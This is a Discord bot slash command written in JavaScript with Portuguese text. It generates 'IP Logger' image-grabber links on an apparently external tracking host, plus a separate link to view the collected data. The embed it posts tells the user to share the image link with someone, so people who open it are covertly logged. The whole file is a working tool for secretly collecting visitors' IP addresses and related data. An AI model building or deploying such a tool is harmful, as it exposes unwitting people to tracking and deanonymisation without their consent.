const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const fs = require('fs');
const path = require('path');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('img')
    .setDescription('📸 Gera um link direto para a imagem com IP Logger')
    .addStringOption(option =>
      option.setName('link')
        .setDescription('Link da imagem (opcional)')
        .setRequired(false)
    )
    .addAttachmentOption(option =>
      option.setName('imagem')
        .setDescription('Faça upload da imagem')
        .setRequired(false)
    ),

  async execute(interaction, client) {
    if (!interaction.memberPermissions.has('Administrator')) {
      return interaction.reply({ content: '❌ Apenas ADMs.', flags: 64 });
    }

    await interaction.deferReply({ flags: 64 });

    const id = Math.random().toString(36).substring(2, 10);
    const link = `https://cbsteam.onrender.com/img/${id}`;
    const dadosLink = `https://cbsteam.onrender.com/dados/${id}`;

    let imagemUrl = interaction.options.getString('link');
    const attachment = interaction.options.getAttachment('imagem');

    if (attachment) {
      imagemUrl = attachment.url;
    }

    // Baixa a imagem e salva localmente com o ID
    if (imagemUrl) {
      try {
        const response = await fetch(imagemUrl);
        const buffer = await response.buffer();
        const publicDir = path.join(__dirname, '..', 'public');
        if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });
        fs.writeFileSync(path.join(publicDir, `${id}.jpg`), buffer);
      } catch (e) {
        console.error('❌ Erro ao baixar imagem:', e);
      }
    } else {
      // Usa imagem padrão
      const publicDir = path.join(__dirname, '..', 'public');
      const padraoJpg = path.join(publicDir, 'imagem.jpg');
      const padraoPng = path.join(publicDir, 'imagem.png');
      if (fs.existsSync(padraoJpg)) {
        fs.copyFileSync(padraoJpg, path.join(publicDir, `${id}.jpg`));
      } else if (fs.existsSync(padraoPng)) {
        fs.copyFileSync(padraoPng, path.join(publicDir, `${id}.png`));
      } else {
        // Fallback: baixa um GIF
        try {
          const response = await fetch('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif');
          const buffer = await response.buffer();
          fs.writeFileSync(path.join(publicDir, `${id}.jpg`), buffer);
        } catch (e) {}
      }
    }

    const embed = new EmbedBuilder()
      .setTitle('📸 IMAGE GRABBER GERADO!')
      .setDescription(`**Link para compartilhar:**\n\`${link}\``)
      .setColor(0xFF0000)
      .addFields(
        { name: '📊 Ver dados', value: `${dadosLink}`, inline: true },
        { name: '🆔 ID', value: `\`${id}\``, inline: true },
        { name: '📝 Dica', value: 'Cole o link no navegador ou compartilhe com alguém!' }
      )
      .setImage(link)
      .setFooter({ text: 'CBS TEAM - Image Grabber' })
      .setTimestamp();

    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel('🔗 Copiar Link')
          .setStyle(ButtonStyle.Primary)
          .setCustomId(`copy_${id}`)
      );

    await interaction.editReply({
      embeds: [embed],
      components: [row]
    });
  }
};